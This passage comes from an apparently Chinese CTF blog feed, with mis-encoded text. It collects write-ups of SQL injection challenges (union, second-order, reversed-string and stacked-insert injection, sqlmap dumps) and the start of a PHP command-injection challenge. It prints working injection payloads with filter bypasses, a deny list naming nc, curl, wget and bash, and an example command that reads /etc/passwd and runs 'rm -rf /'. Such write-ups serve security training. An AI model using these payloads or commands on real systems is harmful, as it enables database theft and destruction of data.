Recruit]babysql</h1><p>è¿‡æ»¤</p><p>hacker!!black_list is &#x2F;if|and|\s|#|â€“&#x2F;i å•å¼•å·é—­åˆ</p><p>%00ç»•è¿‡ ç©ºæ ¼&#x2F;**&#x2F;</p><p>å­—æ®µä¸€ä½</p><p>æš´åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/database();%00</span><br></pre></td></tr></table></figure><p>test</p><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%00</span><br></pre></td></tr></table></figure><p>string(10) â€œflag,usersâ€</p><p>çˆ†åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;;%00</span><br></pre></td></tr></table></figure><p>string(4) â€œflagâ€</p><p>çˆ†å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(flag)/**/from/**/flag;%00</span><br></pre></td></tr></table></figure><p>string(63) â€œå‰æœ‰å·¨å¤§å®ç®±,NSSCTF{629ea8c3-1d54-4eda-a425-dbb573cf61df}â€</p><h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>æ³¨å†Œç™»å½•è¿›å»</p><p>å‘ç°è¾“è¿›å»çš„ä¸œè¥¿è¢«è½¬ä¹‰</p><p>è¿™ä¸ªé¡µé¢æ”¾å¼ƒ</p><p>ç™»å½•é¡µé¢ä¼°è®¡ä¹Ÿä¸è¡Œ</p><p>æ³¨å†Œé¡µé¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select database() # /123456</span><br></pre></td></tr></table></figure><p>é—­åˆæ–¹å¼ä¸ºâ€™â€™</p><p>ç„¶ååœ¨ç™»å½•å‘ç°çˆ†åº“å</p><p>ctftraining</p><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() # </span><br></pre></td></tr></table></figure><p>flag,news,users</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database() # </span><br></pre></td></tr></table></figure><p>flag</p><p>çˆ†å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(flag) from flag # </span><br></pre></td></tr></table></figure><p>NSSCTF{fe961858-8992-45d4-99a6-2b1427517f09}</p><h1 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezsql"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezsql" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezsql"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezsql</h1><p>è¾“å…¥ä¸‡èƒ½å¯†ç </p><p>adminâ€˜) or 1&#x3D;1;#</p><p>å‘ç°è¢«åè½¬äº†äº†è€Œä¸”orè¢«è¿‡æ»¤äº†</p><p>&#x2F;&#x2F;<em>your sql:SELECT * FROM users WHERE passwd&#x3D;(â€˜â€™) AND username&#x3D;(â€˜#;1&#x3D;1 )ï¿½ï¿½ï¿½nimdaâ€™) LIMIT 0,1</em></p><p><a href="https://www.abcdtools.com/reverse">https://www.abcdtools.com/reverse</a></p><p>è¾“å…¥åè½¬åçš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;1=1 ro ) &#x27;nimda</span><br></pre></td></tr></table></figure><p>å‘ç°ç™»å½•è¿›å»äº†</p><p>åˆ¤æ–­å­—æ®µå›æ˜¾ä½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;2,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>ä¸¤ä½ 12</p><p>çˆ†åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>UUCTF</p><p>orè¢«è¿‡æ»¤ çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )(esabatad,)eman_elbat(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>flag,users</p><p>çˆ†åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat dna &#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )(esabatad,)eman_nmuloc(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>UUCTF</p><p>ä¿å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;galf moorrf )(esabatad,)FTCUU(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;Your Login name:NSSCTF{53358f22-a9b8-4397-99bd-a381194cc0d2}<br>&#x2F;&#x2F;Your Password:UUCTF</p><h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;</span>,<span class="variable">$uname</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;<span class="subst">$uname</span>&#x27;;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$db</span>, <span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$db</span>);</span><br><span class="line">  <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æºç ç›´æ¥ç»™å‡ºè¿‡æ»¤çš„å­—ç¬¦</p><p>1â€™â€™1æ³¨é‡Šé—­åˆå­—ç¬¦</p><p>æš´åŠ›æŸ¥å­—æ®µ å‘ç°ä¸‰æ®µ éƒ½æœ‰å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,2,3&#x27;1</span><br></pre></td></tr></table></figure><p>æš´åº“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3&#x27;1</span><br></pre></td></tr></table></figure><p>ctf</p><ul><li><p><strong><code>/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i</code></strong></p><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ…å«äº†å¤šä¸ªå…³é”®è¯å’Œç¬¦å·ï¼Œæ¯ä¸ªå…³é”®è¯æˆ–ç¬¦å·ä¹‹é—´ç”¨ <code>|</code> åˆ†éš”ï¼Œè¡¨ç¤ºâ€œæˆ–â€å…³ç³»ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ¯ä¸ªéƒ¨åˆ†åˆ†åˆ«åŒ¹é…å¦‚ä¸‹å†…å®¹ï¼š</p><ol><li><strong><code>regexp</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>regexp</code>ã€‚</li><li><strong><code>left</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>left</code>ã€‚</li><li><strong><code>extractvalue</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>extractvalue</code>ã€‚</li><li><strong><code>floor</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>floor</code>ã€‚</li><li><strong><code>reverse</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>reverse</code>ã€‚</li><li><strong><code>update</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>update</code>ã€‚</li><li><strong><code>between</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>between</code>ã€‚</li><li><strong><code>flag</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>flag</code>ã€‚</li><li><strong><code>=</code></strong>: åŒ¹é…ç­‰å· <code>=</code>ã€‚</li><li><strong><code>&gt;</code></strong>: åŒ¹é…å¤§äºå· <code>&gt;</code>ã€‚</li><li><strong><code>&lt;</code></strong>: åŒ¹é…å°äºå· <code>&lt;</code>ã€‚</li><li><strong><code>and</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>and</code>ã€‚</li><li><strong><code>\|</code></strong>: åŒ¹é…ç«–çº¿ç¬¦å· <code>|</code>ã€‚</li><li><strong><code>right</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>right</code>ã€‚</li><li><strong><code>substr</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>substr</code>ã€‚</li><li><strong><code>replace</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>replace</code>ã€‚</li><li><strong><code>char</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>char</code>ã€‚</li><li><strong><code>&amp;</code></strong>: åŒ¹é…ç¬¦å· <code>&amp;</code>ã€‚</li><li><strong><code>\\$</code></strong>: åŒ¹é…ç¾å…ƒç¬¦å· <code>$</code>ï¼Œéœ€è¦åŒåæ–œæ æ¥è½¬ä¹‰ã€‚</li><li><strong><code>0x</code></strong>: åŒ¹é…åå…­è¿›åˆ¶å‰ç¼€ <code>0x</code>ã€‚</li><li><strong><code>sleep</code></strong>: åŒ¹é…å­—ç¬¦ä¸² <code>sleep</code>ã€‚</li><li><strong><code>\#</code></strong>: åŒ¹é…äº•å· <code>#</code>ã€‚</li></ol></li><li><p><strong><code>/i</code></strong></p><p>è¿™ä¸ªæ¨¡å¼ä¿®é¥°ç¬¦è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™åŒ¹é…ã€‚</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å•æ‹¿å‡ºæ¥</p><ul><li><code>if ($row[1] === $uname)</code>: æ£€æŸ¥ <code>$row</code> æ•°ç»„ä¸­ç´¢å¼•ä¸º <code>1</code> çš„å…ƒç´ æ˜¯å¦ç­‰äº <code>$uname</code>ã€‚</li><li><code>die($flag);</code>: å¦‚æœç›¸ç­‰ï¼Œåˆ™ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¾“å‡º <code>$flag</code> çš„å€¼ã€‚</li></ul><p>æˆ‘ä»¬ç›´æ¥æ’å…¥ä¸€æ®µè‡ªå®šä¹‰çš„åˆ—è¿›å»ç„¶åè®©unameç­‰äºæˆ‘ä»¬è‡ªå®šä¹‰çš„åˆ—å³å¯</p><p>ä¹‹å‰è®²è¿‡çš„insertæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3;insert/**/into/**/ccctttfff/**/values(&#x27;ss&#x27;,&#x27;Gu0f3n&#x27;,&#x27;1&#x27;);&#x27;1</span><br></pre></td></tr></table></figure><p>ä¹‹åè®©uname&#x3D;Gu0f3n</p><p>NSSCTF{f87847e6-6220-417c-9b7b-2db8d9b5e9fb}</p><h1 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h1><p>å­˜åœ¨äºŒæ¬¡æ³¨å…¥</p><p>é¦–å…ˆéšä¾¿åˆ›å»ºä¸€ä¸ªè´¦å·è¿›å…¥ä¿®æ”¹å¯†ç </p><p>æŸ¥çœ‹æºç </p><p> â€œ update user set password&#x3D;â€™%sâ€™ where username&#x3D;â€™%sâ€™; â€</p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªadminâ€™â€“+å°±å¯ä»¥ç»•è¿‡é—­åˆ</p><p>ä¹‹åä¿®æ”¹è‡ªå·±æƒ³è¦çš„å¯†ç ç™»å½•admin</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B945%E5%88%86.png" alt="image-20240807164508710"></p><p>æŸ¥è¯¢å°±ä¸¤ä¸ªå›æ˜¾ </p><p>exist å’Œno user </p><p>è¯´æ˜èƒ½å¤Ÿæ‰§è¡Œä½†æ²¡å›æ˜¾ï¼Œæ²¡æŠ¥é”™</p><p>è€ƒè™‘ç›²æ³¨</p><p>sqlmapè¯•è¯•</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B958%E5%88%86.png" alt="image-20240807165800615"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>node4.anna.nssctf.cn:<span class="number">28285</span><span class="operator">/</span>query <span class="comment">--data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --tables</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B900%E5%88%86.png" alt="image-20240807165948914"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --columns</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B901%E5%88%86.png" alt="image-20240807170149812"></p><p>çˆ†å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B903%E5%88%86.png" alt="image-20240807170351944"></p><p>NSSCTF{68025097-def3-4ea7-9dda-af4b16c6f1a4}</p><h1 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var</span>)?(<span class="keyword">int</span>)<span class="variable">$val</span>:<span class="variable">$val</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_opt</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$my</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_connect</span>(<span class="variable">$my</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;dbname&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect success&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;show databases;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqlåˆ·é¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciscn2024webå¤ç°</title>
      <link href="/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**ï¼šè®¾ç½® <code>open_basedir</code> é…ç½®é€‰é¡¹ï¼Œé™åˆ¶ PHP åªèƒ½è®¿é—® <code>/var/www/html/</code> ç›®å½•åŠå…¶å­ç›®å½•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>**escapeshellcmd**</code> æ˜¯ä¸€ä¸ª PHP å†…ç½®å‡½æ•°ï¼Œç”¨äºè½¬ä¹‰ä¼ é€’ç»™ shell çš„å­—ç¬¦ä¸²ï¼Œä»¥é˜²æ­¢å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ç¡®ä¿ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨ä½œä¸º shell å‘½ä»¤çš„ä¸€éƒ¨åˆ†æ‰§è¡Œæ—¶ä¸ä¼šè¢«è§£é‡Šä¸ºç‰¹æ®Šå­—ç¬¦æˆ–å‘½ä»¤ã€‚è¿™ä¸ªå‡½æ•°ä¼šåœ¨æŸäº›æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦å‰æ·»åŠ åæ–œæ ï¼Œä»è€Œä½¿è¿™äº›å­—ç¬¦å¤±å»ç‰¹æ®Šå«ä¹‰ã€‚</p><p>eg:</p><p>å‡è®¾æœ‰ä»¥ä¸‹ç”¨æˆ·è¾“å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>escapeshellcmd</code> è½¬ä¹‰åï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå°†ä¼šæ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure><p>è€Œä¸”è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p><p>è·Ÿç€wpå¤ç°</p><p><code>php -r</code> æ˜¯ PHP å‘½ä»¤è¡Œç•Œé¢ï¼ˆCLIï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸ä½ ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ PHP ä»£ç ï¼Œè€Œæ— éœ€åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ¥åŒ…å«è¿™äº›ä»£ç ã€‚<code>-r</code> é€‰é¡¹ç”¨äºæŒ‡å®šä¸€æ®µå°†è¢«æ‰§è¡Œçš„ PHP ä»£ç </p><p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p><p>å‘ç°å¯ä»¥ç›´æ¥æ‰§è¡Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬è¿™å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>ç”±äºç»•è¿‡çš„å‡½æ•°æœ‰äº›å¤šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨hex2bin()å‡½æ•°è¿›è¡Œ16è¿›åˆ¶è½¬å­—ç¬¦è¿›è¡Œç»•è¿‡</p><p>ä½†å‘ç°ç›´æ¥<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p><p>è¡Œä¸é€š</p><p>å‘ç°hex2binéœ€è¦çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°å­—ï¼Œç›´æ¥ä¸¤ä¸ªåŒå¼•å·å‘¢ï¼Ÿ</p><p>ä¸è¡Œ gg å‡†å¤‡è·‘è·¯</p><p>ä½†æ˜¯æ€»æœ‰å¤§ä½¬èƒ½æƒ³å‡ºæ¥</p><p><strong>substr()</strong> è¿™ä¸ªå°±æœ‰ç‚¹ç‰›é€¼äº†</p><p>æˆ‘ä»¬çŸ¥é“</p><p><strong>è‡ªåŠ¨ç±»å‹è½¬æ¢ï¼ˆType Jugglingï¼‰</strong></p><p>PHP æ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ï¼Œå®ƒæ”¯æŒè‡ªåŠ¨ç±»å‹è½¬æ¢ï¼Œç§°ä¸ºâ€œç±»å‹æ‚è€â€ï¼ˆtype jugglingï¼‰ã€‚è¿™æ„å‘³ç€ PHP ä¼šåœ¨éœ€è¦æ—¶è‡ªåŠ¨å°†ä¸€ç§æ•°æ®ç±»å‹è½¬æ¢ä¸ºå¦ä¸€ç§æ•°æ®ç±»å‹ã€‚è¿™ç§è½¬æ¢åœ¨å‡½æ•°å‚æ•°ä¼ é€’æ—¶ç‰¹åˆ«å¸¸è§ã€‚</p><p>å½“ä½ ä¼ é€’ä¸€ä¸ªæ•°å­—ç»™ <code>substr()</code> çš„ <code>$string</code> å‚æ•°æ—¶ï¼ŒPHP ä¼šè‡ªåŠ¨å°†è¿™ä¸ªæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚è¿™æ˜¯å› ä¸º 